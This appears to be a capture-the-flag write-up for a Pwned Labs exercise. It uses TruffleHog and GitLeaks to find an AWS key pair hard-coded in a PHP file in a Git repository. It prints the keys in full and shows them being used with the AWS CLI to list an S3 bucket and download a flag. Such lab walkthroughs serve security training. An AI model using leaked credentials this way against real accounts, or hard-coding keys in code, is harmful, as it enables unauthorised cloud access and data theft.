---
title: hunt-for-secrets-in-git-repos
layout: default
permalink: /writeups/pwnedlabs/:title/
category: pwnedlabs
tags: [writeup]
---

# [hunt-for-secrets-in-git-repos](https://pwnedlabs.io/labs/hunt-for-secrets-in-git-repos)

<br>

### Entry Point

`https://github.com/huge-logistics/cargo-logistics-dev`

<br>

### TruffleHog

```bash
$ trufflehog git https://github.com/huge-logistics/cargo-logistics-dev.git --only-verified
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷                                     
Found verified result 🐷🔑                                                                    
Detector Type: AWS     
Decoder Type: PLAIN      
Raw result: AKIAWHEOTHRFSGQITLIY    
Account: 427648302155            
User_id: AIDAWHEOTHRF24EMR3SXJ
Arn: arn:aws:iam::427648302155:user/dev-test   
Commit: d8098af5fbf1aa35ae22e99b9493ffae5d97d58f
Email: Ian Austin <iandaustin@outlook.com>                                                                                                                                                  
File: log-s3-test/log-upload.php
Line: 10             
Repository: https://github.com/huge-logistics/cargo-logistics-dev.git
Timestamp: 2023-07-04 17:49:13 +0000
```

<br>

### GitLeaks

```bash
$ gitleaks detect . --report-path ../findings.json -v                                     
                                                                                              
    ○                  
    │╲                   
    │ ○                             
    ○ ░                          
    ░    gitleaks             
                                               
Finding:     'key'    => "AKIAWHEOTHRFSGQITLIY",
Secret:      AKIAWHEOTHRFSGQITLIY                                                                                                                                                           
RuleID:      aws-access-token
Entropy:     3.784184
File:        log-s3-test/log-upload.php
Line:        10   
Commit:      d8098af5fbf1aa35ae22e99b9493ffae5d97d58f
Author:      Ian Austin
Email:       iandaustin@outlook.com
Date:        2023-07-04T17:49:13Z                                                             
Fingerprint: d8098af5fbf1aa35ae22e99b9493ffae5d97d58f:log-s3-test/log-upload.php:aws-access-token:10
                                               
Finding:     'secret' => "IqHCweAXZOi8WJlQrhuQulSuGnUO51HFgy7ZShoB",
Secret:      IqHCweAXZOi8WJlQrhuQulSuGnUO51HFgy7ZShoB  
RuleID:      generic-api-key
Entropy:     4.853056    
File:        log-s3-test/log-upload.php
Line:        11                  
Commit:      d8098af5fbf1aa35ae22e99b9493ffae5d97d58f
Author:      Ian Austin
Email:       iandaustin@outlook.com
Date:        2023-07-04T17:49:13Z                                                                                                                                                           
Fingerprint: d8098af5fbf1aa35ae22e99b9493ffae5d97d58f:log-s3-test/log-upload.php:generic-api-key:11
                                               
2:48PM INF 4 commits scanned.
2:48PM INF scan completed in 1.38s                                                            
2:48PM WRN leaks found: 2
```

File contents of `log-upload.php` at commit `d8098af5fbf1aa35ae22e99b9493ffae5d97d58f`:

```php
<?php

// Include the SDK using the composer autoloader
require 'vendor/autoload.php';

$s3 = new Aws\S3\S3Client([
	'region'  => 'us-east-1',
	'version' => 'latest',
	'credentials' => [
	    'key'    => "AKIAWHEOTHRFSGQITLIY",
	    'secret' => "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",
	]
]);

// Send a PutObject request and get the result object.
$key = 'transact.log';

$result = $s3->putObject([
	'Bucket' => 'huge-logistics-transact',
	'Key'    => $key,
	'SourceFile' => 'transact.log'
]);

// Print the body of the result by indexing into the result object.
var_dump($result);

?>
```

From our enumeration, we have the following credentials for the user `dev-test`:
```bash
AWS_ACCESS_KEY = AKIAWHEOTHRFSGQITLIY
AWS_SECRET_KEY = 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
AWS_REGION = us-east-1
```

We also find the `huge-logistics-transact` S3 bucket.

Trying to list the contents of this S3 bucket, we get the following:
```bash
$ aws --profile dev-test s3 ls s3://huge-logistics-transact
2023-07-05 08:53:50         32 flag.txt
2023-07-04 10:15:47          5 transact.log
2023-07-05 08:57:36      51968 web_transactions.csv
```

We can now attempt to download and read `flag.txt`
```bash
$ aws --profile dev-test s3 cp s3://huge-logistics-transact/flag.txt .
download: s3://huge-logistics-transact/flag.txt to ./flag.txt
```

```bash
$ cat flag.txt        
fe108d6a1a0937b0a7620947a678aabf
```
